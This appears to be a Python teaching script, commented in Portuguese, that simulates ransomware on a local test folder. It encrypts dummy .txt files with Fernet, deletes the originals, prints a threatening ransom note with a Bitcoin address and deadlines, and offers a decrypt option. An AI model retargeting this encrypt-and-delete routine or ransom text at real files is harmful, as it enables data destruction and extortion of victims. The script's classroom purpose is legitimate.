"""
=============================================================
  RANSOMWARE SIMULADO - FINS EDUCACIONAIS APENAS
=============================================================
  Este script é uma SIMULAÇÃO controlada para fins de
  aprendizado em cibersegurança. NÃO deve ser usado fora
  de ambiente controlado. Criado para o curso de Python.
=============================================================
"""

import os
import base64
from cryptography.fernet import Fernet
from pathlib import Path
import json

# ─── Configurações ───────────────────────────────────────────
TARGET_DIR = Path("./arquivos_teste")       # Diretório alvo (apenas pasta local)
KEY_FILE   = Path("./chave_secreta.key")    # Onde a chave seria "enviada" ao atacante
INFO_FILE  = Path("./LEIA-ME_RESGATE.txt")  # Mensagem de resgate


def criar_arquivos_teste():
    """Cria arquivos fictícios para demonstrar o ataque."""
    TARGET_DIR.mkdir(exist_ok=True)
    samples = {
        "relatorio_financeiro.txt": "Receita Q1: R$ 1.200.000\nDespesas: R$ 800.000\nLucro: R$ 400.000",
        "contatos_clientes.txt":    "João Silva - joao@empresa.com\nMaria Lima - maria@empresa.com",
        "senhas_backup.txt":        "Sistema ERP: admin / S3nh@2024\nVPN: vpn_user / V3rdade!23",
        "projeto_secreto.txt":      "Fase 1: Análise de mercado\nFase 2: Desenvolvimento MVP\nFase 3: Lançamento",
    }
    for nome, conteudo in samples.items():
        (TARGET_DIR / nome).write_text(conteudo, encoding="utf-8")
    print(f"[+] {len(samples)} arquivos de teste criados em '{TARGET_DIR}/'")


def gerar_chave():
    """Gera uma chave simétrica Fernet (AES-128-CBC + HMAC-SHA256)."""
    chave = Fernet.generate_key()
    KEY_FILE.write_bytes(chave)
    print(f"[+] Chave gerada e salva em '{KEY_FILE}'")
    print(f"    (Em um ataque real, essa chave seria enviada ao servidor do atacante)")
    return chave


def criptografar_arquivos(chave: bytes):
    """Criptografa todos os .txt no diretório alvo."""
    fernet = Fernet(chave)
    arquivos = list(TARGET_DIR.glob("*.txt"))
    log = []

    print(f"\n[*] Iniciando criptografia de {len(arquivos)} arquivo(s)...")
    for arquivo in arquivos:
        conteudo = arquivo.read_bytes()
        criptografado = fernet.encrypt(conteudo)
        novo_nome = arquivo.with_suffix(".enc")
        novo_nome.write_bytes(criptografado)
        arquivo.unlink()   # Remove o original
        log.append(str(arquivo.name))
        print(f"    [ENC] {arquivo.name}  →  {novo_nome.name}")

    # Salva log dos arquivos afetados
    Path("./arquivos_afetados.json").write_text(json.dumps(log, indent=2, ensure_ascii=False))
    print(f"\n[!] Criptografia concluída. {len(arquivos)} arquivo(s) bloqueados.")
    exibir_mensagem_resgate()


def exibir_mensagem_resgate():
    """Exibe e salva a típica mensagem de resgate de ransomware."""
    mensagem = """
╔══════════════════════════════════════════════════════════════╗
║              ⚠️  SEUS ARQUIVOS FORAM BLOQUEADOS  ⚠️          ║
╚══════════════════════════════════════════════════════════════╝

  Todos os seus arquivos importantes foram CRIPTOGRAFADOS.
  Fotos, documentos, projetos, banco de dados — TUDO bloqueado.

  Para recuperar seus arquivos você deve:

    1. Enviar R$ 5.000,00 em Bitcoin para:
       → bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh

    2. Após o pagamento, envie o comprovante para:
       → suporte_recuperacao@darkweb.onion

    3. Você receberá a chave de descriptografia em até 24h.

  ⏳ PRAZO: 72 HORAS — após isso o valor DOBRA.
  ⏳ 7 DIAS  — após isso seus arquivos são DESTRUÍDOS permanentemente.

  NÃO tente recuperar com antivírus — os arquivos serão corrompidos.
  NÃO contacte autoridades — monitoramos sua rede.

──────────────────────────────────────────────────────────────
  [SIMULAÇÃO EDUCACIONAL - Este ataque é FICTÍCIO]
  [Em um ataque real, a chave estaria APENAS com o atacante]
──────────────────────────────────────────────────────────────
"""
    print(mensagem)
    INFO_FILE.write_text(mensagem, encoding="utf-8")


def descriptografar_arquivos(chave: bytes):
    """Descriptografa os arquivos — simula o 'pagamento do resgate'."""
    fernet = Fernet(chave)
    arquivos = list(TARGET_DIR.glob("*.enc"))

    print(f"\n[*] Descriptografando {len(arquivos)} arquivo(s)...")
    for arquivo in arquivos:
        conteudo = arquivo.read_bytes()
        descriptografado = fernet.decrypt(conteudo)
        original = arquivo.with_suffix(".txt")
        original.write_bytes(descriptografado)
        arquivo.unlink()
        print(f"    [DEC] {arquivo.name}  →  {original.name}")

    print(f"\n[+] Descriptografia concluída! Arquivos restaurados.")


def menu():
    print("\n" + "="*60)
    print("  SIMULADOR DE RANSOMWARE")
    print("="*60)
    print("  1. Criar arquivos de teste")
    print("  2. EXECUTAR ATAQUE (criptografar)")
    print("  3. DESCRIPTOGRAFAR (simular pagamento)")
    print("  4. Sair")
    print("="*60)
    return input("  Escolha uma opção: ").strip()


def main():
    while True:
        opcao = menu()

        if opcao == "1":
            criar_arquivos_teste()

        elif opcao == "2":
            if not TARGET_DIR.exists() or not list(TARGET_DIR.glob("*.txt")):
                print("[!] Crie os arquivos de teste primeiro (opção 1).")
                continue
            chave = gerar_chave()
            criptografar_arquivos(chave)

        elif opcao == "3":
            if not KEY_FILE.exists():
                print("[!] Chave não encontrada. Execute o ataque primeiro.")
                continue
            chave = KEY_FILE.read_bytes()
            descriptografar_arquivos(chave)

        elif opcao == "4":
            print("[*] Saindo...")
            break
        else:
            print("[!] Opção inválida.")


if __name__ == "__main__":
    main()
